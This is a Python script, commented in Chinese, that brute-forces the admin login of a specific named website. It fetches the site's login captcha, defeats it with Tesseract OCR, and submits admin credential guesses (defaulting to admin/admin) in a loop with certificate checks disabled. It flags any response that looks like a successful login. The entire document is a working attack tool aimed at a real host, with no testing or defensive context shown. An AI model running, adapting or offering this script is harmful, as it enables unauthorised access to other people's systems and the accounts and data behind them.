#!/usr/bin/env python3
"""sbkj.mi-ma.cc 验证码登录爆破"""
import urllib.request, http.cookiejar, subprocess, io, time, sys, ssl
from PIL import Image

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

BASE = "https://sbkj.mi-ma.cc"
cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj), urllib.request.HTTPSHandler(context=ctx))
op.addheaders = [("User-Agent", "Mozilla/5.0")]

def get_code():
    for i in range(3):
        try:
            r = op.open(f"{BASE}/admin/login/getcode", timeout=8)
            return r.read()
        except: pass
    return None

def ocr(data):
    try:
        img = Image.open(io.BytesIO(data)).convert("L")
        img = img.resize((img.width*3, img.height*3), Image.LANCZOS)
        img = img.point(lambda x: 0 if x < 160 else 255)
        img.save("/tmp/sb_tmp.png")
        for psm in ["7","8","13"]:
            r = subprocess.run(["tesseract","/tmp/sb_tmp.png","stdout","--psm",psm,
                "-c","tessedit_char_whitelist=0123456789abcdefghijklmnopqrstuvwxyz"],
                capture_output=True, timeout=10)
            t = r.stdout.decode().strip().replace(" ","").replace("\n","")
            if len(t) >= 4:
                return t[:6]
    except: pass
    return None

def login(name, pwd, code):
    data = f"name={name}&password={pwd}&vercode={code}&remember=0".encode()
    try:
        r = op.open(urllib.request.Request(f"{BASE}/admin/login/login", data=data), timeout=8)
        body = r.read().decode("utf-8","ignore")
        return body
    except Exception as e:
        return f"ERR:{e}"

def main():
    pwd = sys.argv[1] if len(sys.argv) > 1 else "admin"
    user = sys.argv[2] if len(sys.argv) > 2 else "admin"
    # 先访问首页建立session
    op.open(f"{BASE}/", timeout=8)
    for i in range(40):
        cap = get_code()
        if not cap: continue
        code = ocr(cap)
        if not code:
            print(f"[{i}] OCR fail", flush=True)
            continue
        body = login(user, pwd, code)
        if "ERR" in body:
            print(f"[{i}] code={code} ERR {body[:60]}", flush=True)
        elif "验证码" in body or "vercode" in body.lower():
            print(f"[{i}] code={code} 验证码错", flush=True)
        elif "密码" in body or "用户" in body or "错误" in body:
            print(f"[{i}] code={code} 账号错: {body[:80]}", flush=True)
        else:
            print(f"[{i}] code={code} -> {body[:150]}", flush=True)
            if len(body) < 300 or "login" not in body.lower():
                print(f"!!! 可能成功: {user}/{pwd}", flush=True)
                break
        time.sleep(0.5)
    print("DONE")

if __name__ == "__main__":
    main()
